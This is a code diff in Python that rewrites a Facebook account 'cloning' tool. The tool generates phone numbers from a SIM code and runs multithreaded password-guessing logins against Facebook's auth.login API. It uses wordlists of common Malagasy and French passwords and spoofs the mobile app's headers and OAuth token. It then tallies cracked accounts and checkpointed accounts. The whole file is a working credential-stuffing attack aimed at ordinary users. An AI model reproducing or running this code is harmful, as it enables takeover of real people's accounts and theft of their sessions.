@@ -108,69 +108,37 @@ def BD_CLONING():
     for nmbr in range(limit):
         nmp=''.join(map(str, generate_random_sequence(7)))
         user.append(nmp)
-    with Executor(max_workers=100) as NODE:
-        total_users=len(users_ids)
-        for number_ph_after in users_ids:
-            number_ph=sim_code+number_ph_after
-            pass_list=[number_ph, '0'+sim_code[3:]+number_ph_after,number_ph_after,
-                       number_ph_after[:6],number_ph_after[6:],number_ph[5:],number_ph[6:],
-                       'malala','fitiavana','mamako','malalako','mamiko','badoda','mendrika',
-                       'antananarivo','Antananarivo','marary','milely','taimbo','hanitra',
-                       'vadiko','jesosy','mahery','malagasy','Malagasy','henintsoa','mahaleo',
-                       'miangaly','nomena','nantenaina','fanantenana','sarobidy','fanomezana',
-                       'fanomezantsoa','dadatoa','tsiory','tsiaro','bonjour','madagasikara',
-                       'tiavima','boxeur','jacque','titanic','qwerty','azerty','papasosy',
-                       'mamasossy','tahiana','tantely','tanora','felana','tsilavina',
-                       'nekena','finoana','fanantenana','harena','anjara','vololona',
-                       'liantsoa','tanjona','fifaliana','je t\'aime','fanomezana','narindra',
-                       'mirindra','lalaina','voahangy','iharitiana','mamisoa','mamatsoa',
-                       'sitraka','herilaza','herilaza','cedrick','nasaina','nandrianina',
-                       'tafita','safidy','fenosoa','domoina','hasina','nilaina']
-            NODE.submit(cracker_method,number_ph,pass_list)
-    print(color('green','\nACOUNT CLONED :'+str(len(user_auth))))
-    input(color('green','\nCLONING FINISHED'))
-    program()
+    with tred(max_workers=100) as Dipto:
+        tl=str(len(user))
+        print(' TOTAL ACCOUNT : '+tl)
+        print(' YOUR SIM CODE : '+code)
+        print(' CLONING EN COURS ... ')
+        linex()
+        for psx in user:
+            ids=code+psx
+            passlist=[psx,ids,ids[:6],ids[:6],ids[5:],ids[6:],'fanantenana','Fanantenana','mamako','Mamako','nirina','Nirina','mamiko','Mamiko','malala','Malala','malalako','Malalako','malagasy','Malagasy','malala','fitiavana','mamako','malalako','mamiko','badoda','mendrika', 'antananarivo','Antananarivo','marary','milely','taimbo','hanitra',  'vadiko','jesosy','mahery','malagasy','Malagasy','henintsoa','mahaleo','hanitra', 'vadiko','jesosy','mahery','malagasy','Malagasy','henintsoa','mahaleo',   'miangaly','nomena','nantenaina','fanantenana','sarobidy','fanomezana',      'fanomezantsoa','dadatoa','tsiory','tsiaro','bonjour','madagasikara',    'tiavima','boxeur','jacque','titanic','qwerty','azerty','papasosy',   'mamasossy','tahiana','tantely','tanora','felana','tsilavina',     'nekena','finoana','fanantenana','harena','anjara','vololona', 'liantsoa','tanjona','fifaliana','je t\'aime','fanomezana','narindra',  'mirindra','lalaina','voahangy','iharitiana','mamisoa','mamatsoa',  'sitraka','herilaza','herilaza','cedrick','nasaina','nandrianina',  'tafita','safidy','fenosoa','domoina','hasina','nilaina'] 
+            Dipto.submit(method_crack,ids,passlist)
+    linex()
+    print(' LE CLONING EST FINI ')
+    print(' TOTAL OK ID '+str(len(oks)))
+    print(' TOTAL CP ID '+str(len(cps)))
+    input(' PRESS ENTER TO BACK  : ')
+    MR_ITACHI()
 #------------ method crack def ---------#
-def cracker_method(number_ph,pass_list):
-    global user_auth
+def method_crack(ids, passlist):
+    global oks
+    global cps
     global loop
     try:
-        for password in pass_list:
-            sys.stdout.write('\r\r [Progress] %s'%(loop))
+        for pas in passlist:
+            sys.stdout.write('\r\r \033[1;37m[Progress] %s|\033[1;32mSucces:%s'%(loop,len(oks)))
             sys.stdout.flush()
             adid=str(uuid.uuid4())
-            adid=str(uuid.uuid4())
             device_id=str(uuid.uuid4())
-            payloads={'adid': adid,
-                      'format': 'json',
-                      'device_id': device_id,
-                      'email': number_ph,
-                      'password': password,
-                      'generate_analytics_claims': '1',
-                      'credentials_type': 'password',
-                      'source': 'login',
-                      'error_detail_type': 'button_with_disabled',
-                      'enroll_misauth': 'false',
-                      'generate_session_cookies': '1',
-                      'generate_machine_id': '1',
-                      'meta_inf_fbmeta': '',
-                      'currently_logged_in_userid': '0',
-                      'fb_api_req_friendly_name': 'authenticate'}
-            headers={'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]',
-                     'Accept-Encoding': 'gzip, deflate',
-                     'Accept': '*/*',
-                     'Connection': 'keep-alive',
-                     'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
-                     'X-FB-Friendly-Name': 'authenticate',
-                     'X-FB-Connection-Bandwidth': '21435',
-                     'X-FB-Net-HNI': '35793',
-                     'X-FB-SIM-HNI': '37855',
-                     'X-FB-Connection-Type': 'unknown',
-                     'Content-Type': 'application/x-www-form-urlencoded',
-                     'X-FB-HTTP-Engine': 'Liger'}
+            datax={'adid': adid, 'format': 'json', 'device_id': device_id, 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'meta_inf_fbmeta': '', 'currently_logged_in_userid': '0', 'fb_api_req_friendly_name': 'authenticate'}
+            header={'User-Agent': '[FBAN/FB4A;FBAV/368.0.0.24.108;FBBV/371897983;FBDM/{density=1.0,width=600,height=976};FBLC/en_US;FBCR/null;FBMF/JTYjay;FBBD/D101;FBPN/com.facebook.katana;FBDV/D101;FBSV/4.4.2;nullFBCA/armeabi-v7a:armeabi;]', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Friendly-Name': 'authenticate', 'X-FB-Connection-Bandwidth': '21435', 'X-FB-Net-HNI': '35793', 'X-FB-SIM-HNI': '37855', 'X-FB-Connection-Type': 'unknown', 'Content-Type': 'application/x-www-form-urlencoded', 'X-FB-HTTP-Engine': 'Liger'}
             url='https://api.facebook.com/method/auth.login'
-            response=requests.post(url,data=payloads,headers=headers)
-            response=response.json()
+            reqx=requests.post(url,data=datax,headers=header).json()
             if 'session_key' in reqx:
                 try:
                     uid=reqx['uid']
